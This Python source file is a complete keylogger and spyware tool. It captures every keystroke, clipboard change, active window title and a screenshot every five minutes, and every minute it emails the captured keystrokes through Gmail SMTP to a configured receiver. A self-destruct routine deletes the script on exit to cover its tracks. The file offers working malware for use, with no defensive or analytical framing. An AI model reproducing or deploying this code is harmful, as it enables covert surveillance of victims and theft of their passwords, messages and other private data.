import keyboard
import smtplib
import time
import os
import gzip
import shutil
from PIL import ImageGrab
import pygetwindow as gw
import pyperclip
import atexit
import threading

# Configuration
LOG_DIR = r"# PATH OF THE DIRECTORY WHERE YOU WANT TO STORE YOUR KEYLOG'D CAPTURES"
LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
EMAIL_ADDRESS = os.environ.get(
    "EMAIL_ADDRESS"
)  # Use environment variables for security
EMAIL_PASSWORD = os.environ.get(
    "EMAIL_PASSWORD"
)  # Use environment variables for security
RECEIVER_EMAIL = os.environ.get("RECEIVER_EMAIL")
LOG_INTERVAL = 60  # Log every 60 seconds
SCREENSHOT_INTERVAL = 300  # Capture screenshot every 5 minutes


def send_email(log_data):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, RECEIVER_EMAIL, log_data)
        server.close()
    except Exception as e:
        print(f"Error sending email: {e}")


def log_keystrokes():
    global start_time  # Declare it here
    keystrokes = []
    start_time = time.time()  # Initialize start_time

    try:
        while True:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                keystrokes.append(event.name)

            if len(keystrokes) > 0 and time.time() - start_time > LOG_INTERVAL:
                with open(LOG_FILE, "a") as log_file:
                    log_file.write("".join(keystrokes) + "\n")
                send_email("".join(keystrokes))
                keystrokes.clear()
                start_time = time.time()  # Reset start_time
    except KeyboardInterrupt:
        print("Keylogging stopped.")


def log_clipboard():
    prev_clipboard = ""
    try:
        while True:
            current_clipboard = (
                pyperclip.paste()
            )  # Platform-independent clipboard access
            if current_clipboard != prev_clipboard:
                with open(LOG_FILE, "a") as log_file:
                    log_file.write(f"Clipboard: {current_clipboard}\n")
                prev_clipboard = current_clipboard
            time.sleep(1)
    except KeyboardInterrupt:
        print("Clipboard logging stopped.")


def capture_screenshot():
    try:
        while True:
            screenshot = ImageGrab.grab()
            screenshot.save(os.path.join(LOG_DIR, f"screenshot_{int(time.time())}.png"))
            time.sleep(SCREENSHOT_INTERVAL)
    except KeyboardInterrupt:
        print("Screenshot capturing stopped.")


def get_active_window():
    try:
        while True:
            active_window = gw.getActiveWindow()
            if active_window is not None:
                with open(
                    LOG_FILE, "a", encoding="utf-8"
                ) as log_file:  # Set encoding to UTF-8
                    log_file.write(f"Active Window: {active_window.title}\n")
            time.sleep(5)
    except KeyboardInterrupt:
        print("Active window logging stopped.")


def compress_logs():
    with open(LOG_FILE, "rb") as f_in:
        with gzip.open(LOG_FILE + ".gz", "wb") as f_out:
            shutil.copyfileobj(f_in, f_out)
    os.remove(LOG_FILE)  # Remove the original log file


def self_destruct():
    os.remove(__file__)  # Remove the script file itself


if __name__ == "__main__":
    start_time = time.time()  # Initialize start_time at the start

    # Register self-destruction on exit (optional)
    atexit.register(self_destruct)

    # Start logging in threads
    keyboard_thread = threading.Thread(target=log_keystrokes, daemon=True)
    clipboard_thread = threading.Thread(target=log_clipboard, daemon=True)
    screenshot_thread = threading.Thread(target=capture_screenshot, daemon=True)
    window_thread = threading.Thread(target=get_active_window, daemon=True)

    keyboard_thread.start()
    clipboard_thread.start()
    screenshot_thread.start()
    window_thread.start()

    try:
        # Keep the program running
        keyboard_thread.join()
        clipboard_thread.join()
        screenshot_thread.join()
        window_thread.join()
    except KeyboardInterrupt:
        print("Stopping all logging...")
